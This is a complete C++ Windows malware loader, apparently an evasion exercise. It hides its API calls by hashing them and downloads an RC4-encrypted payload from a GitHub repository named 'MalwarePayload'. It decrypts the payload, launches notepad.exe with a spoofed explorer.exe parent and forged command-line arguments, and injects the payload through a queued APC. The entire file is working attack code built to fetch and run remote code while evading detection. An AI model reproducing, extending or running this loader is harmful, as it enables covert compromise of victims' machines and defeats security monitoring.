﻿#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#include "Structs.h"

#pragma warning(disable:4996)
#pragma comment (lib, "Wininet.lib")

#define SEED 5

constexpr int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define HASHA(API) (HashStringDjb2A((const char*) API))



#define TARGET_PAYLOAD_URL         L"https://github.com/dagimAB/MalwarePayload/raw/refs/heads/main/rc4encpayload.bin"
#define SPOOF_PARENT          L"explorer.exe"
#define SACRIFICIAL_DLL            "kernel32.dll"
#define SACRIFICIAL_FUNC           "BaseThreadInitThunk"
#define STARTUP_ARGUMENRS          "TotallyLegitBenignArgument"
#define SPAWN_BINARY         "notepad.exe"
#define SPAWN_BINARY_W      L"notepad.exe"
#define REAL_EXECUTED_ARGUMENTS    L"notepad.exe"


unsigned char Rc4Key[] = {
    0xF7, 0x15, 0x4D, 0x5D, 0xBA, 0xE7, 0xC1, 0x81, 0x03, 0x2C, 0xD9, 0xC6, 0xCF, 0x35, 0xB2, 0xA0
};
#define RC4_KEY_SIZE sizeof(Rc4Key)




FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}




HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InLoadOrderModuleList.Flink);

    while (pDte && pDte->DllBase != NULL) {
        if (pDte->BaseDllName.Length != NULL && pDte->BaseDllName.Length < MAX_PATH) {

            WCHAR UpperCaseDllName[MAX_PATH];
            DWORD i = 0;

            while (pDte->BaseDllName.Buffer[i] && i < (pDte->BaseDllName.Length / sizeof(WCHAR))) {
                UpperCaseDllName[i] = (WCHAR)towupper(pDte->BaseDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = L'\0';


            if (HashStringDjb2W(UpperCaseDllName) == dwModuleNameHash) {
                return (HMODULE)(pDte->DllBase);
            }
        }
        pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;
    }
    return NULL;
}






typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* fnReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(WINAPI* fnResumeThread)(HANDLE);
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);

typedef HANDLE(WINAPI* fnGetProcessHeap)(VOID);
typedef LPVOID(WINAPI* fnHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI* fnHeapFree)(HANDLE, DWORD, LPVOID);
typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* fnGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef DWORD(WINAPI* fnQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* fnCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef DWORD(WINAPI* fnGetLastError)(VOID);
typedef PVOID(WINAPI* fnVirtualAllocEx)(HANDLE, PVOID, SIZE_T, DWORD, DWORD);


typedef HINTERNET(WINAPI* fnInternetOpenW)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* fnInternetOpenUrlW)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* fnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fnInternetCloseHandle)(HINTERNET);







constexpr auto KERNEL32_Hash = HashStringDjb2W(L"KERNEL32.DLL");
constexpr auto NTDLL_Hash = HashStringDjb2A("NTDLL.DLL");


CTIME_HASHA(VirtualAllocEx);
CTIME_HASHA(CreateMutexA);
CTIME_HASHA(GetLastError);
CTIME_HASHA(SystemFunction032);
CTIME_HASHA(LoadLibraryA);
CTIME_HASHA(ReadProcessMemory);
CTIME_HASHA(WriteProcessMemory);
CTIME_HASHA(VirtualProtectEx);
CTIME_HASHA(ResumeThread);
CTIME_HASHA(NtQuerySystemInformation);
CTIME_HASHA(NtQueryInformationProcess);
CTIME_HASHA(OpenProcess);
CTIME_HASHA(CloseHandle);
CTIME_HASHA(GetProcessHeap);
CTIME_HASHA(HeapAlloc);
CTIME_HASHA(HeapFree);
CTIME_HASHA(CreateProcessA);
CTIME_HASHA(GetEnvironmentVariableA);
CTIME_HASHA(QueueUserAPC);
CTIME_HASHA(InternetOpenW);
CTIME_HASHA(InternetOpenUrlW);
CTIME_HASHA(InternetReadFile);
CTIME_HASHA(InternetCloseHandle);





typedef struct _LOCAL_USTRING {
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;
} LOCAL_USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct _LOCAL_USTRING* Img, struct _LOCAL_USTRING* Key);
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);





BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;
    fnHeapAlloc pHeapAlloc = (fnHeapAlloc)GetProcAddressH(hKernel32, HeapAlloc_Rotr32A);
    fnHeapFree pHeapFree = (fnHeapFree)GetProcAddressH(hKernel32, HeapFree_Rotr32A);
    fnGetProcessHeap pGetProcessHeap = (fnGetProcessHeap)GetProcAddressH(hKernel32, GetProcessHeap_Rotr32A);

    fnReadProcessMemory pReadProcessMemory = (fnReadProcessMemory)GetProcAddressH(hKernel32, ReadProcessMemory_Rotr32A);
    if (pReadProcessMemory == NULL) return FALSE;

    SIZE_T sBytes = 0;
    // I don't know why, but when i use the hashed api function for the heapalloc, heapfree and getprocessheap it'll crash..
    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    if (!pReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sBytes)) {
        HeapFree(GetProcessHeap(), 0, *ppReadBuffer);
        return FALSE;
    }
    return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN DWORD dwBufferSize) {
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_Rotr32A);
    if (pWriteProcessMemory == NULL) return FALSE;

    SIZE_T sBytes = 0;
    return (pWriteProcessMemory(hProcess, pAddress, pBuffer, dwBufferSize, &sBytes) && sBytes == dwBufferSize);
}




BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    LOCAL_USTRING Key = { dwRc4KeySize, dwRc4KeySize, pRc4Key };
    LOCAL_USTRING Img = { sPayloadSize, sPayloadSize, pPayloadData };

    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_Rotr32A);
    if (pLoadLibraryA == NULL) return FALSE;


    HMODULE hCryptSpModule = pLoadLibraryA("cryptsp.dll");
    if (hCryptSpModule == NULL) return FALSE;

    fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)GetProcAddressH(hCryptSpModule, SystemFunction032_Rotr32A);
    if (pSystemFunction032 == NULL) {

        return FALSE;
    }

    NTSTATUS status = pSystemFunction032(&Img, &Key);
    if (status != 0x0) {
        return FALSE;
    }

    return TRUE;
}




BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    PBYTE pBytes = NULL;
    PBYTE pTmpBytes = NULL;
    BOOL bSuccess = FALSE;
    SIZE_T sSize = 0;
    DWORD dwBytesRead = 0;


    
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_Rotr32A);
    if (pLoadLibraryA == NULL) return FALSE;

    HMODULE hWinInet = pLoadLibraryA("wininet.dll");
    if (hWinInet == NULL) return FALSE;

    fnInternetOpenW pInternetOpenW = (fnInternetOpenW)GetProcAddressH(hWinInet, InternetOpenW_Rotr32A);
    fnInternetOpenUrlW pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressH(hWinInet, InternetOpenUrlW_Rotr32A);
    fnInternetReadFile pInternetReadFile = (fnInternetReadFile)GetProcAddressH(hWinInet, InternetReadFile_Rotr32A);
    fnInternetCloseHandle pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(hWinInet, InternetCloseHandle_Rotr32A);

    if (!pInternetOpenW || !pInternetOpenUrlW || !pInternetReadFile || !pInternetCloseHandle) return FALSE;

    hInternet = pInternetOpenW(L"DagimUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) return FALSE;

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) goto _CleanupZone;

    hInternetFile = pInternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) goto _CleanupZone;



    while (pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead) && dwBytesRead > 0) {
        sSize += dwBytesRead;
        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        }
        else {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) goto _CleanupZone;
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;
    bSuccess = TRUE;

_CleanupZone:
    if (pTmpBytes) LocalFree(pTmpBytes);
    if (!bSuccess && pBytes) LocalFree(pBytes);
    if (hInternetFile) pInternetCloseHandle(hInternetFile);
    if (hInternet) pInternetCloseHandle(hInternet);
    return bSuccess;
}





#define PAYLOAD_CONTROL_STRING "LocalProcessMonitorMutex"

BOOL IsInstanceRunning() {
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnCreateMutexA pCreateMutexA = (fnCreateMutexA)GetProcAddressH(hKernel32, CreateMutexA_Rotr32A);
    fnGetLastError pGetLastError = (fnGetLastError)GetProcAddressH(hKernel32, GetLastError_Rotr32A);
    fnCloseHandle pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_Rotr32A);

    if (pCreateMutexA == NULL || pGetLastError == NULL || pCloseHandle == NULL) return FALSE;

    HANDLE hMutex = pCreateMutexA(NULL, FALSE, PAYLOAD_CONTROL_STRING);
    if (hMutex != NULL && pGetLastError() == ERROR_ALREADY_EXISTS) {
        pCloseHandle(hMutex);
        return TRUE;
    }
    return FALSE;
}



BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {
    HMODULE hNtdllModule = GetModuleHandleH(NTDLL_Hash);
    if (hNtdllModule == NULL) return FALSE;
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddressH(hNtdllModule, NtQuerySystemInformation_Rotr32A);
    if (pNtQuerySystemInformation == NULL) return FALSE;

    typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);
    fnOpenProcess pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_Rotr32A);
    if (pOpenProcess == NULL) return FALSE;


    ULONG uReturnLen = 0;
    pNtQuerySystemInformation(5, NULL, 0, &uReturnLen);
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen);
    if (SystemProcInfo == NULL) return FALSE;


    PVOID pValueToFree = SystemProcInfo;
    if (pNtQuerySystemInformation(5, SystemProcInfo, uReturnLen, &uReturnLen) != 0x0) {
        HeapFree(GetProcessHeap(), 0, pValueToFree);
        return FALSE;
    }


    while (TRUE) {
        if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            *pdwPid = (DWORD)(ULONG_PTR)SystemProcInfo->UniqueProcessId;
            *phProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
            break;
        }
        if (!SystemProcInfo->NextEntryOffset) break;
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(), 0, pValueToFree);
    return (*pdwPid != 0 && *phProcess != NULL);
}




BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, IN LPCSTR lpFakeArguments, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    fnGetEnvironmentVariableA pGetEnvironmentVariableA = (fnGetEnvironmentVariableA)GetProcAddressH(hKernel32, GetEnvironmentVariableA_Rotr32A);
    fnCreateProcessA pCreateProcessA = (fnCreateProcessA)GetProcAddressH(hKernel32, CreateProcessA_Rotr32A);

    if (!pGetEnvironmentVariableA  || !pCreateProcessA) return FALSE;

    CHAR                    lpPath[MAX_PATH * 2];
    CHAR                    lpCommandLine[MAX_PATH * 3];
    CHAR                    CurrentDir[MAX_PATH];
    CHAR                    WnDr[MAX_PATH];

    SIZE_T                          sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST     pThreadAttList = NULL;

    STARTUPINFOEXA          SiEx = { 0 };
    PROCESS_INFORMATION     Pi = { 0 };

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {

        return FALSE;
    }


    sprintf(lpPath, "%s\\Sysnative\\%s", WnDr, lpProcessName);
    sprintf(CurrentDir, "%s\\Sysnative\\", WnDr);


    sprintf(lpCommandLine, "\"%s\" %s", lpPath, lpFakeArguments);

    //I don't know why, but when i use hashed pInitializeProcThreadAttributeList it'll crash..
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) return FALSE;

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        HeapFree(GetProcessHeap(), 0, pThreadAttList);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        DeleteProcThreadAttributeList(pThreadAttList);
        HeapFree(GetProcessHeap(), 0, pThreadAttList);
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;



    if (!pCreateProcessA(NULL, lpCommandLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, CurrentDir, &SiEx.StartupInfo, &Pi)) {

        sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
        sprintf(CurrentDir, "%s\\System32\\", WnDr);
        sprintf(lpCommandLine, "\"%s\" %s", lpPath, lpFakeArguments);

        if (!pCreateProcessA(NULL, lpCommandLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, CurrentDir, &SiEx.StartupInfo, &Pi)) {

            DeleteProcThreadAttributeList(pThreadAttList);
            HeapFree(GetProcessHeap(), 0, pThreadAttList);
            return FALSE;
        }
    }

    printf("[+] DONE \n");
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    DeleteProcThreadAttributeList(pThreadAttList);
    return TRUE;
}



BOOL SpoofTargetProcessArguments(IN HANDLE hProcess, IN LPCWSTR szRealArgs, IN LPCWSTR szExposedProcessName) {

    HMODULE hNtdllModule = GetModuleHandleH(NTDLL_Hash);
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hNtdllModule == NULL || hKernel32 == NULL) return FALSE;

    PROCESS_BASIC_INFORMATION PBI = { 0 };
    ULONG uRet = 0;
    PPEB pLocalPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS_EX pLocalParams = NULL;

    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddressH(hNtdllModule, NtQueryInformationProcess_Rotr32A);
    if (pNtQueryInformationProcess == NULL || pNtQueryInformationProcess(hProcess, 0, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRet) != 0) return FALSE;



    if (!ReadFromTargetProcess(hProcess, PBI.PebBaseAddress, (PVOID*)&pLocalPeb, sizeof(PEB))) return FALSE;

    if (!ReadFromTargetProcess(hProcess, pLocalPeb->ProcessParameters, (PVOID*)&pLocalParams, sizeof(RTL_USER_PROCESS_PARAMETERS_EX))) {
        HeapFree(GetProcessHeap(), 0, pLocalPeb);
        return FALSE;
    }



    DWORD dwBufSize = (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + sizeof(WCHAR));
    if (!WriteToTargetProcess(hProcess, pLocalParams->CommandLine.Buffer, (PVOID)szRealArgs, dwBufSize)) return FALSE;


    USHORT MaskedLength = (USHORT)(lstrlenW(szExposedProcessName) * sizeof(WCHAR));
    PVOID pRemoteLenField = (PVOID)((PBYTE)pLocalPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS_EX, CommandLine.Length));

    if (!WriteToTargetProcess(hProcess, pRemoteLenField, (PVOID)&MaskedLength, sizeof(USHORT))) return FALSE;

    HeapFree(GetProcessHeap(), 0, pLocalPeb);
    HeapFree(GetProcessHeap(), 0, pLocalParams);
    return TRUE;
}




BOOL WritePayload(HANDLE hProcess, PBYTE pPayload, SIZE_T sPayloadSize, PVOID* ppAllocatedAddress) {
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32 == NULL) return FALSE;

    typedef PVOID(WINAPI* fnVirtualAllocEx)(HANDLE, PVOID, SIZE_T, DWORD, DWORD);
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressH(hKernel32, VirtualAllocEx_Rotr32A);
    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_Rotr32A);
    fnVirtualProtectEx pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_Rotr32A);

    if (pVirtualAllocEx == NULL || pWriteProcessMemory == NULL || pVirtualProtectEx == NULL) return FALSE;


    *ppAllocatedAddress = pVirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAllocatedAddress == NULL) {
        return FALSE;
    }

    SIZE_T sNumberOfBytesWritten = 0;
    if (!pWriteProcessMemory(hProcess, *ppAllocatedAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
        return FALSE;
    }

    DWORD dwOldProtection = 0;
    if (!pVirtualProtectEx(hProcess, *ppAllocatedAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        return FALSE;
    }

    return TRUE;
}






int main() {

    if (IsInstanceRunning()) {

        return -1;
    }


    SIZE_T sBytesSize = 0;
    PBYTE pBufferArea = NULL;

    if (!GetPayloadFromUrl(TARGET_PAYLOAD_URL, &pBufferArea, &sBytesSize)) return -1;

    if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBufferArea, sizeof(Rc4Key), (DWORD)sBytesSize)) {
        return -1;
    }


    DWORD dwParentPid = 0;
    HANDLE hParentHandle = NULL;

    if (!GetRemoteProcessHandle(SPOOF_PARENT, &dwParentPid, &hParentHandle)) {
        LocalFree(pBufferArea);
        return -1;
    }

    DWORD dwTargetPid = 0;
    HANDLE hTargetProcess = NULL, hTargetThread = NULL;

    if (!CreatePPidSpoofedProcess(hParentHandle, SPAWN_BINARY, STARTUP_ARGUMENRS, &dwTargetPid, &hTargetProcess, &hTargetThread)) {
        CloseHandle(hParentHandle);
        LocalFree(pBufferArea);
        return -1;
    }


    if (!SpoofTargetProcessArguments(hTargetProcess, REAL_EXECUTED_ARGUMENTS, SPAWN_BINARY_W)) {
        CloseHandle(hTargetProcess);
        CloseHandle(hTargetThread);
        CloseHandle(hParentHandle);
        LocalFree(pBufferArea);
        return -1;
    }


    HMODULE hKernel32Mod = GetModuleHandleH(KERNEL32_Hash);
    if (hKernel32Mod == NULL) return -1;


    PVOID pRemoteTargetFunctionAddress = NULL;


    if (!WritePayload(hTargetProcess, pBufferArea, sBytesSize, &pRemoteTargetFunctionAddress)) {
        CloseHandle(hTargetProcess); CloseHandle(hTargetThread); CloseHandle(hParentHandle);
        LocalFree(pBufferArea); return -1;
    }

    QueueUserAPC((PAPCFUNC)pRemoteTargetFunctionAddress, hTargetThread, NULL);

    fnResumeThread pResumeThread = (fnResumeThread)GetProcAddressH(hKernel32Mod, ResumeThread_Rotr32A);
    if (pResumeThread != NULL) {
        pResumeThread(hTargetThread);
    }

    LocalFree(pBufferArea);
    CloseHandle(hTargetProcess);
    CloseHandle(hTargetThread);
    CloseHandle(hParentHandle);

    return 0;
}

